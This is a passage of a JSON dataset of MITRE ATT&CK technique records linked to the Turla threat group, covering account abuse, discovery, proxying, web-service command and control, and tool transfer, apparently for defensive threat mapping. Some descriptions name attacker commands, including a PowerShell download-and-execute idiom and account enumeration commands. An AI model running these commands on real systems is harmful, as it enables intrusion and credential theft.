        "url": "https://www.microsoft.com/security/blog/2020/04/02/attack-matrix-kubernetes/",
        "description": "Weizman, Y. (2020, April 2). Threat Matrix for Kubernetes. Retrieved March 30, 2021.",
        "external_id": "none"
      },
      {
        "source_name": "Metasploit SSH Module",
        "url": "https://github.com/rapid7/metasploit-framework/tree/master/modules/exploits/linux/ssh",
        "description": "undefined. (n.d.). Retrieved April 12, 2019.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "administrator|user",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--6151cbea-819b-455a-9fa6-99a1cc58797d",
    "platform": "windows|azure-ad|office-365|saas|iaas|linux|macos|google-workspace|containers",
    "tid": "T1078.001",
    "technique": "Default Accounts",
    "tactic": "persistence",
    "datasources": "logon-session-creation|user-account-authentication",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "hyperstack",
    "correlation_tool": "none",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may obtain and abuse credentials of a default account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Default accounts are those that are built-into an OS, such as the Guest or Administrator accounts on Windows systems. Default accounts also include default factory/provider set accounts on other types of systems, software, or devices, including the root user account in AWS and the default service account in Kubernetes.(Citation: Microsoft Local Accounts Feb 2019)(Citation: AWS Root User)(Citation: Threat Matrix for Kubernetes)\n\nDefault accounts are not limited to client machines, rather also include accounts that are preset for equipment such as network devices and computer applications whether they are internal, open source, or commercial. Appliances that come preset with a username and password combination pose a serious threat to organizations that do not change it post installation, as they are easy targets for an adversary. Similarly, adversaries may also utilize publicly disclosed or stolen [Private Keys](https://attack.mitre.org/techniques/T1552/004) or credential materials to legitimately connect to remote environments via [Remote Services](https://attack.mitre.org/techniques/T1021).(Citation: Metasploit SSH Module)",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/70.html",
        "description": "none",
        "external_id": "CAPEC-70"
      },
      {
        "source_name": "Microsoft Local Accounts Feb 2019",
        "url": "https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/local-accounts",
        "description": "Microsoft. (2018, December 9). Local Accounts. Retrieved February 11, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "AWS Root User",
        "url": "https://docs.aws.amazon.com/IAM/latest/UserGuide/id_root-user.html",
        "description": "Amazon. (n.d.). AWS Account Root User. Retrieved April 5, 2021.",
        "external_id": "none"
      },
      {
        "source_name": "Threat Matrix for Kubernetes",
        "url": "https://www.microsoft.com/security/blog/2020/04/02/attack-matrix-kubernetes/",
        "description": "Weizman, Y. (2020, April 2). Threat Matrix for Kubernetes. Retrieved March 30, 2021.",
        "external_id": "none"
      },
      {
        "source_name": "Metasploit SSH Module",
        "url": "https://github.com/rapid7/metasploit-framework/tree/master/modules/exploits/linux/ssh",
        "description": "undefined. (n.d.). Retrieved April 12, 2019.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "administrator|user",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--6151cbea-819b-455a-9fa6-99a1cc58797d",
    "platform": "windows|azure-ad|office-365|saas|iaas|linux|macos|google-workspace|containers",
    "tid": "T1078.001",
    "technique": "Default Accounts",
    "tactic": "privilege-escalation",
    "datasources": "logon-session-creation|user-account-authentication",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "hyperstack",
    "correlation_tool": "none",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may obtain and abuse credentials of a default account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Default accounts are those that are built-into an OS, such as the Guest or Administrator accounts on Windows systems. Default accounts also include default factory/provider set accounts on other types of systems, software, or devices, including the root user account in AWS and the default service account in Kubernetes.(Citation: Microsoft Local Accounts Feb 2019)(Citation: AWS Root User)(Citation: Threat Matrix for Kubernetes)\n\nDefault accounts are not limited to client machines, rather also include accounts that are preset for equipment such as network devices and computer applications whether they are internal, open source, or commercial. Appliances that come preset with a username and password combination pose a serious threat to organizations that do not change it post installation, as they are easy targets for an adversary. Similarly, adversaries may also utilize publicly disclosed or stolen [Private Keys](https://attack.mitre.org/techniques/T1552/004) or credential materials to legitimately connect to remote environments via [Remote Services](https://attack.mitre.org/techniques/T1021).(Citation: Metasploit SSH Module)",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/70.html",
        "description": "none",
        "external_id": "CAPEC-70"
      },
      {
        "source_name": "Microsoft Local Accounts Feb 2019",
        "url": "https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/local-accounts",
        "description": "Microsoft. (2018, December 9). Local Accounts. Retrieved February 11, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "AWS Root User",
        "url": "https://docs.aws.amazon.com/IAM/latest/UserGuide/id_root-user.html",
        "description": "Amazon. (n.d.). AWS Account Root User. Retrieved April 5, 2021.",
        "external_id": "none"
      },
      {
        "source_name": "Threat Matrix for Kubernetes",
        "url": "https://www.microsoft.com/security/blog/2020/04/02/attack-matrix-kubernetes/",
        "description": "Weizman, Y. (2020, April 2). Threat Matrix for Kubernetes. Retrieved March 30, 2021.",
        "external_id": "none"
      },
      {
        "source_name": "Metasploit SSH Module",
        "url": "https://github.com/rapid7/metasploit-framework/tree/master/modules/exploits/linux/ssh",
        "description": "undefined. (n.d.). Retrieved April 12, 2019.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "administrator|user",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--fdc47f44-dd32-4b99-af5f-209f556f63c2",
    "platform": "linux|macos|windows|containers",
    "tid": "T1078.003",
    "technique": "Local Accounts",
    "tactic": "defense-evasion",
    "datasources": "logon-session-creation|logon-session-metadata|user-account-authentication",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may obtain and abuse credentials of a local account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Local accounts are those configured by an organization for use by users, remote support, services, or for administration on a single system or service.\n\nLocal Accounts may also be abused to elevate privileges and harvest credentials through [OS Credential Dumping](https://attack.mitre.org/techniques/T1003). Password reuse may allow the abuse of local accounts across a set of machines on a network for the purposes of Privilege Escalation and Lateral Movement. ",
    "technique_references": [],
    "technique_required_permissions": "administrator|user",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--fdc47f44-dd32-4b99-af5f-209f556f63c2",
    "platform": "linux|macos|windows|containers",
    "tid": "T1078.003",
    "technique": "Local Accounts",
    "tactic": "initial-access",
    "datasources": "logon-session-creation|logon-session-metadata|user-account-authentication",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may obtain and abuse credentials of a local account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Local accounts are those configured by an organization for use by users, remote support, services, or for administration on a single system or service.\n\nLocal Accounts may also be abused to elevate privileges and harvest credentials through [OS Credential Dumping](https://attack.mitre.org/techniques/T1003). Password reuse may allow the abuse of local accounts across a set of machines on a network for the purposes of Privilege Escalation and Lateral Movement. ",
    "technique_references": [],
    "technique_required_permissions": "administrator|user",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--fdc47f44-dd32-4b99-af5f-209f556f63c2",
    "platform": "linux|macos|windows|containers",
    "tid": "T1078.003",
    "technique": "Local Accounts",
    "tactic": "persistence",
    "datasources": "logon-session-creation|logon-session-metadata|user-account-authentication",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may obtain and abuse credentials of a local account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Local accounts are those configured by an organization for use by users, remote support, services, or for administration on a single system or service.\n\nLocal Accounts may also be abused to elevate privileges and harvest credentials through [OS Credential Dumping](https://attack.mitre.org/techniques/T1003). Password reuse may allow the abuse of local accounts across a set of machines on a network for the purposes of Privilege Escalation and Lateral Movement. ",
    "technique_references": [],
    "technique_required_permissions": "administrator|user",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--fdc47f44-dd32-4b99-af5f-209f556f63c2",
    "platform": "linux|macos|windows|containers",
    "tid": "T1078.003",
    "technique": "Local Accounts",
    "tactic": "privilege-escalation",
    "datasources": "logon-session-creation|logon-session-metadata|user-account-authentication",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may obtain and abuse credentials of a local account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Local accounts are those configured by an organization for use by users, remote support, services, or for administration on a single system or service.\n\nLocal Accounts may also be abused to elevate privileges and harvest credentials through [OS Credential Dumping](https://attack.mitre.org/techniques/T1003). Password reuse may allow the abuse of local accounts across a set of machines on a network for the purposes of Privilege Escalation and Lateral Movement. ",
    "technique_references": [],
    "technique_required_permissions": "administrator|user",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--354a7f88-63fb-41b5-a801-ce3b377b36f1",
    "platform": "windows|iaas|linux|macos|network",
    "tid": "T1082",
    "technique": "System Information Discovery",
    "tactic": "discovery",
    "datasources": "command-execution|instance-metadata|os-api-execution|process-creation",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "epic|kazuar|lightneuron|penquin",
    "correlation_tool": "empire|systeminfo",
    "correlation_gid": "G0010",
    "technique_description": "An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information from [System Information Discovery](https://attack.mitre.org/techniques/T1082) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nTools such as [Systeminfo](https://attack.mitre.org/software/S0096) can be used to gather detailed system information. If running with privileged access, a breakdown of system data can be gathered through the <code>systemsetup</code> configuration tool on macOS. As an example, adversaries with user-level access can execute the <code>df -aH</code> command to obtain currently mounted disks and associated freely available space. Adversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to gather detailed system information.(Citation: US-CERT-TA18-106A) [System Information Discovery](https://attack.mitre.org/techniques/T1082) combined with information gathered from other forms of discovery and reconnaissance can drive payload development and concealment.(Citation: OSX.FairyTale)(Citation: 20 macOS Common Tools and Techniques)\n\nInfrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs. Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine.(Citation: Amazon Describe Instance)(Citation: Google Instances Resource)(Citation: Microsoft Virutal Machine API)",
    "technique_references": [
      {
        "source_name": "Amazon Describe Instance",
        "url": "https://docs.aws.amazon.com/cli/latest/reference/ssm/describe-instance-information.html",
        "description": "Amazon. (n.d.). describe-instance-information. Retrieved March 3, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Google Instances Resource",
        "url": "https://cloud.google.com/compute/docs/reference/rest/v1/instances",
        "description": "Google. (n.d.). Rest Resource: instance. Retrieved March 3, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Virutal Machine API",
        "url": "https://docs.microsoft.com/en-us/rest/api/compute/virtualmachines/get",
        "description": "Microsoft. (2019, March 1). Virtual Machines - Get. Retrieved October 8, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "20 macOS Common Tools and Techniques",
        "url": "https://labs.sentinelone.com/20-common-tools-techniques-used-by-macos-threat-actors-malware/",
        "description": "Phil Stokes. (2021, February 16). 20 Common Tools & Techniques Used by macOS Threat Actors & Malware. Retrieved August 23, 2021.",
        "external_id": "none"
      },
      {
        "source_name": "OSX.FairyTale",
        "url": "https://www.sentinelone.com/blog/trail-osx-fairytale-adware-playing-malware/",
        "description": "Phile Stokes. (2018, September 20). On the Trail of OSX.FairyTale | Adware Playing at Malware. Retrieved August 24, 2021.",
        "external_id": "none"
      },
      {
        "source_name": "US-CERT-TA18-106A",
        "url": "https://www.us-cert.gov/ncas/alerts/TA18-106A",
        "description": "US-CERT. (2018, April 20). Alert (TA18-106A) Russian State-Sponsored Cyber Actors Targeting Network Infrastructure Devices. Retrieved October 19, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/312.html",
        "description": "none",
        "external_id": "CAPEC-312"
      }
    ],
    "technique_required_permissions": "none",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--7bc57495-ea59-4380-be31-a64af124ef18",
    "platform": "linux|macos|windows|network",
    "tid": "T1083",
    "technique": "File and Directory Discovery",
    "tactic": "discovery",
    "datasources": "command-execution|os-api-execution|process-creation",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "epic|kazuar|penquin",
    "correlation_tool": "empire",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system. Adversaries may use the information from [File and Directory Discovery](https://attack.mitre.org/techniques/T1083) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nMany command shell utilities can be used to obtain this information. Examples include <code>dir</code>, <code>tree</code>, <code>ls</code>, <code>find</code>, and <code>locate</code>.(Citation: Windows Commands JPCERT) Custom tools may also be used to gather file and directory information and interact with the [Native API](https://attack.mitre.org/techniques/T1106). Adversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to gather file and directory information.(Citation: US-CERT-TA18-106A)",
    "technique_references": [
      {
        "source_name": "Windows Commands JPCERT",
        "url": "https://blogs.jpcert.or.jp/en/2016/01/windows-commands-abused-by-attackers.html",
        "description": "Tomonaga, S. (2016, January 26). Windows Commands Abused by Attackers. Retrieved February 2, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "US-CERT-TA18-106A",
        "url": "https://www.us-cert.gov/ncas/alerts/TA18-106A",
        "description": "US-CERT. (2018, April 20). Alert (TA18-106A) Russian State-Sponsored Cyber Actors Targeting Network Infrastructure Devices. Retrieved October 19, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/127.html",
        "description": "none",
        "external_id": "CAPEC-127"
      },
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/497.html",
        "description": "none",
        "external_id": "CAPEC-497"
      }
    ],
    "technique_required_permissions": "none",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--25659dd6-ea12-45c4-97e6-381e3e4b593e",
    "platform": "linux|macos|windows",
    "tid": "T1087.001",
    "technique": "Local Account",
    "tactic": "discovery",
    "datasources": "command-execution|file-access|os-api-execution|process-creation",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "epic|hyperstack|kazuar",
    "correlation_tool": "empire|net",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may attempt to get a listing of local system accounts. This information can help adversaries determine which local accounts exist on a system to aid in follow-on behavior.\n\nCommands such as <code>net user</code> and <code>net localgroup</code> of the [Net](https://attack.mitre.org/software/S0039) utility and <code>id</code> and <code>groups</code>on macOS and Linux can list local users and groups. On Linux, local users can also be enumerated through the use of the <code>/etc/passwd</code> file. On macOS the <code>dscl . list /Users</code> command can be used to enumerate local accounts.",
    "technique_references": [
      {
        "source_name": "Elastic - Koadiac Detection with EQL",
        "url": "https://www.elastic.co/blog/embracing-offensive-tooling-building-detections-against-koadic-using-eql",
        "description": "Stepanic, D.. (2020, January 13). Embracing offensive tooling: Building detections against Koadic using EQL. Retrieved November 30, 2020.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "user",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--21875073-b0ee-49e3-9077-1e2a885359af",
    "platform": "linux|macos|windows",
    "tid": "T1087.002",
    "technique": "Domain Account",
    "tactic": "discovery",
    "datasources": "command-execution|os-api-execution|process-creation",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "",
    "correlation_tool": "empire|net",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may attempt to get a listing of domain accounts. This information can help adversaries determine which domain accounts exist to aid in follow-on behavior.\n\nCommands such as <code>net user /domain</code> and <code>net group /domain</code> of the [Net](https://attack.mitre.org/software/S0039) utility, <code>dscacheutil -q group</code>on macOS, and <code>ldapsearch</code> on Linux can list domain users and groups.",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/575.html",
        "description": "none",
        "external_id": "CAPEC-575"
      }
    ],
    "technique_required_permissions": "user",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--731f4f55-b6d0-41d1-a7a9-072a66389aea",
    "platform": "linux|macos|windows|network",
    "tid": "T1090",
    "technique": "Proxy",
    "tactic": "command-and-control",
    "datasources": "network-connection-creation|network-traffic-content|network-traffic-flow",
    "has_subtechniques": true,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [
      "T1090.001",
      "T1090.002",
      "T1090.003",
      "T1090.004"
    ],
    "count_subtechniques": 4,
    "correlation_adversary": "turla",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may use a connection proxy to direct network traffic between systems or act as an intermediary for network communications to a command and control server to avoid direct connections to their infrastructure. Many tools exist that enable traffic redirection through proxies or port redirection, including [HTRAN](https://attack.mitre.org/software/S0040), ZXProxy, and ZXPortMap. (Citation: Trend Micro APT Attack Tools) Adversaries use these types of proxies to manage command and control communications, reduce the number of simultaneous outbound network connections, provide resiliency in the face of connection loss, or to ride over existing trusted communications paths between victims to avoid suspicion. Adversaries may chain together multiple proxies to further disguise the source of malicious traffic.\n\nAdversaries can also take advantage of routing schemes in Content Delivery Networks (CDNs) to proxy command and control traffic.",
    "technique_references": [
      {
        "source_name": "Trend Micro APT Attack Tools",
        "url": "http://blog.trendmicro.com/trendlabs-security-intelligence/in-depth-look-apt-attack-tools-of-the-trade/",
        "description": "Wilhoit, K. (2013, March 4). In-Depth Look: APT Attack Tools of the Trade. Retrieved December 2, 2015.",
        "external_id": "none"
      },
      {
        "source_name": "University of Birmingham C2",
        "url": "https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf",
        "description": "Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "none",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--a10641f4-87b4-45a3-a906-92a149cb2c27",
    "platform": "windows|azure-ad|office-365|iaas|linux|macos|google-workspace|saas",
    "tid": "T1098",
    "technique": "Account Manipulation",
    "tactic": "persistence",
    "datasources": "active-directory-object-modification|command-execution|file-modification|group-modification|process-creation|user-account-modification",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "none",
    "correlation_tool": "mimikatz",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may manipulate accounts to maintain access to victim systems. Account manipulation may consist of any action that preserves adversary access to a compromised account, such as modifying credentials or permission groups. These actions could also include account activity designed to subvert security policies, such as performing iterative password updates to bypass password duration policies and preserve the life of compromised credentials. \n\nIn order to create or manipulate accounts, the adversary must already have sufficient permissions on systems or the domain. However, account manipulation may also lead to privilege escalation where modifications grant access to additional roles, permissions, or higher-privileged [Valid Accounts](https://attack.mitre.org/techniques/T1078).",
    "technique_references": [
      {
        "source_name": "Microsoft Security Event 4670",
        "url": "https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4670",
        "description": "Franklin Smith, R. (n.d.). Windows Security Log Event ID 4670. Retrieved November 4, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft User Modified Event",
        "url": "https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4738",
        "description": "Lich, B., Miroshnikov, A. (2017, April 5). 4738(S): A user account was changed. Retrieved June 30, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "InsiderThreat ChangeNTLM July 2017",
        "url": "https://blog.stealthbits.com/manipulating-user-passwords-with-mimikatz-SetNTLM-ChangeNTLM",
        "description": "Warren, J. (2017, July 11). Manipulating User Passwords with Mimikatz. Retrieved December 4, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "GitHub Mimikatz Issue 92 June 2017",
        "url": "https://github.com/gentilkiwi/mimikatz/issues/92",
        "description": "Warren, J. (2017, June 22). lsadump::changentlm and lsadump::setntlm work, but generate Windows events #92. Retrieved December 4, 2017.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "none",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--830c9528-df21-472c-8c14-a036bf17d665",
    "platform": "linux|macos|windows",
    "tid": "T1102",
    "technique": "Web Service",
    "tactic": "command-and-control",
    "datasources": "network-connection-creation|network-traffic-content|network-traffic-flow",
    "has_subtechniques": true,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [
      "T1102.001",
      "T1102.002",
      "T1102.003"
    ],
    "count_subtechniques": 3,
    "correlation_adversary": "turla",
    "correlation_malware": "carbon",
    "correlation_tool": "none",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may use an existing, legitimate external Web service as a means for relaying data to/from a compromised system. Popular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.\n\nUse of Web services may also protect back-end C2 infrastructure from discovery through malware binary analysis while also enabling operational resiliency (since this infrastructure may be dynamically changed).",
    "technique_references": [
      {
        "source_name": "University of Birmingham C2",
        "url": "https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf",
        "description": "Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "user",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--be055942-6e63-49d7-9fa1-9cb7d8a8f3f4",
    "platform": "linux|macos|windows",
    "tid": "T1102.002",
    "technique": "Bidirectional Communication",
    "tactic": "command-and-control",
    "datasources": "network-connection-creation|network-traffic-content|network-traffic-flow",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "comrat|crutch|kazuar|powerstallion",
    "correlation_tool": "empire",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may use an existing, legitimate external Web service as a means for sending commands to and receiving output from a compromised system over the Web service channel. Compromised systems may leverage popular websites and social media to host command and control (C2) instructions. Those infected systems can then send the output from those commands back over that Web service channel. The return traffic may occur in a variety of ways, depending on the Web service being utilized. For example, the return traffic may take the form of the compromised system posting a comment on a forum, issuing a pull request to development project, updating a document hosted on a Web service, or by sending a Tweet. \n\nPopular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection. ",
    "technique_references": [
      {
        "source_name": "University of Birmingham C2",
        "url": "https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf",
        "description": "Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "user",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--e6919abc-99f9-4c6c-95a5-14761e7b2add",
    "platform": "linux|macos|windows",
    "tid": "T1105",
    "technique": "Ingress Tool Transfer",
    "tactic": "command-and-control",
    "datasources": "file-creation|network-connection-creation|network-traffic-content|network-traffic-flow",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "gazer|kazuar|lightneuron|mosquito|penquin|tinyturla",
    "correlation_tool": "certutil|empire",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may transfer tools or other files from an external system into a compromised environment. Tools or files may be copied from an external adversary-controlled system to the victim network through the command and control channel or through alternate protocols such as [ftp](https://attack.mitre.org/software/S0095). Once present, adversaries may also transfer/spread tools between victim devices within a compromised environment (i.e. [Lateral Tool Transfer](https://attack.mitre.org/techniques/T1570)). \n\nFiles can also be transferred using various [Web Service](https://attack.mitre.org/techniques/T1102)s as well as native or otherwise present tools on the victim system.(Citation: PTSecurity Cobalt Dec 2016)\n\nOn Windows, adversaries may use various utilities to download tools, such as `copy`, `finger`, and [PowerShell](https://attack.mitre.org/techniques/T1059/001) commands such as <code>IEX(New-Object Net.WebClient).downloadString()</code> and <code>Invoke-WebRequest</code>. On Linux and macOS systems, a variety of utilities also exist, such as `curl`, `scp`, `sftp`, `tftp`, `rsync`, `finger`, and `wget`.(Citation: t1105_lolbas)",
    "technique_references": [
      {
        "source_name": "University of Birmingham C2",
        "url": "https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf",
        "description": "Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "t1105_lolbas",
        "url": "https://lolbas-project.github.io/#t1105",
        "description": "LOLBAS. (n.d.). LOLBAS Mapped to T1105. Retrieved March 11, 2022.",
        "external_id": "none"
      },
      {
        "source_name": "PTSecurity Cobalt Dec 2016",
        "url": "https://www.ptsecurity.com/upload/corporate/ww-en/analytics/Cobalt-Snatch-eng.pdf",
        "description": "Positive Technologies. (2016, December 16). Cobalt Snatch. Retrieved October 9, 2018.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "none",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--391d824f-0ef1-47a0-b0ee-c59a75e27670",
    "platform": "windows|macos|linux",
    "tid": "T1106",
    "technique": "Native API",
    "tactic": "execution",
    "datasources": "module-load|os-api-execution",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "comrat|hyperstack|lightneuron|mosquito|tinyturla",
    "correlation_tool": "empire",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may interact with the native OS application programming interface (API) to execute behaviors. Native APIs provide a controlled means of calling low-level OS services within the kernel, such as those involving hardware/devices, memory, and processes.(Citation: NT API Windows)(Citation: Linux Kernel API) These native APIs are leveraged by the OS during system boot (when other system components are not yet initialized) as well as carrying out tasks and requests during routine operations.\n\nNative API functions (such as <code>NtCreateProcess</code>) may be directed invoked via system calls / syscalls, but these features are also often exposed to user-mode applications via interfaces and libraries.(Citation: OutFlank System Calls)(Citation: CyberBit System Calls)(Citation: MDSec System Calls) For example, functions such as the Windows API <code>CreateProcess()</code> or GNU <code>fork()</code> will allow programs and scripts to start other processes.(Citation: Microsoft CreateProcess)(Citation: GNU Fork) This may allow API callers to execute a binary, run a CLI command, load modules, etc. as thousands of similar API functions exist for various system operations.(Citation: Microsoft Win32)(Citation: LIBC)(Citation: GLIBC)\n\nHigher level software frameworks, such as Microsoft .NET and macOS Cocoa, are also available to interact with native APIs. These frameworks typically provide language wrappers/abstractions to API functionalities and are designed for ease-of-use/portability of code.(Citation: Microsoft NET)(Citation: Apple Core Services)(Citation: MACOS Cocoa)(Citation: macOS Foundation)\n\nAdversaries may abuse these OS API functions as a means of executing behaviors. Similar to [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059), the native API and its hierarchy of interfaces provide mechanisms to interact with and utilize various components of a victimized system. While invoking API functions, adversaries may also attempt to bypass defensive tools (ex: unhooking monitored functions via [Disable or Modify Tools](https://attack.mitre.org/techniques/T1562/001)).",
    "technique_references": [
      {
        "source_name": "MACOS Cocoa",
        "url": "https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/OSX_Technology_Overview/CocoaApplicationLayer/CocoaApplicationLayer.html#//apple_ref/doc/uid/TP40001067-CH274-SW1",
